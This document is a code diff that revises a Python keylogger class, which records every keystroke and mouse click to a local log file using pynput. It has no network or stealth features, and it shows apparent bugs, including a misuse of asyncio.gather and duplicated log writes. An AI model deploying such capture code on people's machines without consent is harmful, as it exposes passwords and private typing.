@@ -1,62 +1,55 @@
-# import os
-# from pynput.keyboard import Key, Listener
-# from pynput.mouse import Listener as MouseListener
-
-# # Function to create folder tree
-# def create_folder_tree():
-#     folders = ["logs", "instructions"]  # Add more folders if needed
-#     for folder in folders:
-#         os.makedirs(folder, exist_ok=True)
-
-# # Call the function to create the folder tree
-# create_folder_tree()
-
-# # Function to handle keyboard events
-# def on_press(key):
-#     with open("logs/log.txt", "a") as f:
-#         f.write(f"Key pressed: {key}\n")
-
-# # Function to handle mouse events
-# def on_click(x, y, button, pressed):
-#     with open("logs/log.txt", "a") as f:
-#         if pressed:
-#             f.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")
-
-# # Start listening for keyboard and mouse events
-# with Listener(on_press=on_press) as k_listener, MouseListener(on_click=on_click) as m_listener:
-#     k_listener.join()
-#     m_listener.join()
-
-
 import os
 import asyncio
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
 
 class Keylogger:
     def __init__(self):
-        self.log_file = "logs/log.txt"
+        self.log_file = os.path.join(os.path.dirname(__file__), "logs", "log.txt")
         self.create_folder_tree()
         self.log_handle = open(self.log_file, "a")
+        self.k_listener = None
+        self.m_listener = None
 
     def create_folder_tree(self):
         folders = ["logs", "instructions"]
         for folder in folders:
-            os.makedirs(folder, exist_ok=True)
+            os.makedirs(os.path.join(os.path.dirname(__file__), folder), exist_ok=True)
 
     def on_press(self, key):
+        print(f"Key pressed: {key}")  # Debug print
         self.log_handle.write(f"Key pressed: {key}\n")
+        self.old_save_to_file(f"Key pressed: {key}\n")
 
     def on_click(self, x, y, button, pressed):
-        if pressed:
-            self.log_handle.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")
+        print(f"Mouse clicked at ({x}, {y}) with button {button}")  # Debug print
+        self.log_handle.write(f"Mouse clicked at ({x}, {y}) with button {button}\n")
+        self.old_save_to_file(f"Mouse clicked at ({x}, {y}) with button {button}\n")
 
     async def start_logging(self):
-        async with Listener(on_press=self.on_press) as k_listener, MouseListener(on_click=self.on_click) as m_listener:
-            await asyncio.gather(k_listener.join(), m_listener.join())
+        try:
+            self.k_listener = KeyboardListener(on_press=self.on_press)
+            self.m_listener = MouseListener(on_click=self.on_click)
+
+            self.k_listener.start()
+            self.m_listener.start()
+
+            await asyncio.gather(self.k_listener.join(), self.m_listener.join())
+        except Exception as e:
+            print(f"Error: {e}")  # Debug print
+        finally:
+            self.stop_logging()
 
     def stop_logging(self):
+        if self.k_listener:
+            self.k_listener.stop()
+        if self.m_listener:
+            self.m_listener.stop()
         self.log_handle.close()
+
+    def old_save_to_file(self, message):
+        with open(os.path.join(os.path.dirname(__file__), "logs", "log.txt"), "a") as f:
+            f.write(message)
 
 async def main():
     keylogger = Keylogger()
